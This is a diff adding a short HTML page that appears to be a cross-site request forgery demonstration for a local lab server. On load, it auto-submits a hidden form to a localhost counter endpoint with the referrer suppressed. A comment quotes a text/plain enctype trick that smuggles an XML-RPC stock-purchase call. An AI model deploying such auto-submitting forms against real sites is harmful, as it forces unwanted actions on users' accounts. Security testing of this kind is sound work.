@@ -1,0 +1,28 @@
+<html lang="en">
+<head>
+    <meta name="referrer" content="no-referrer">
+</head>
+<script>
+    window.addEventListener('load', (event) => {
+        document.getElementById('incrementForm').submit()
+    });
+</script>
+<!-- Possible enctype values:
+    * application/x-www-form-urlencoded (default)
+    * multipart/form-data
+    * text/plain
+
+Firefox auto-corrects the Content-Type to application/x-www-form-urlencoded if an invalid enctype is given.
+
+Potential bypass if the target endpoint does not limit the accepted content types (http://pentestmonkey.net/blog/csrf-xml-post-request):
+<form name="buy" ENCTYPE="text/plain" action="http://localhost:8080/xmlrpc/trade.rem" method="POST">
+    <input type="hidden" name='<?xml version'
+        value='"1.0"?><methodCall><methodName>stocks.buy</methodName><params><param><value><string>MSFT</string></value></param><param><value><double>26</double></value></param></params></methodCall>'>
+</form>
+<script>document.buy.submit();</script>
+
+-->
+<form id="incrementForm" method="post" action="http://localhost:8080/counter" enctype="application/x-www-form-urlencoded">
+    <input name="value" value="100" type="hidden">
+</form>
+</html>
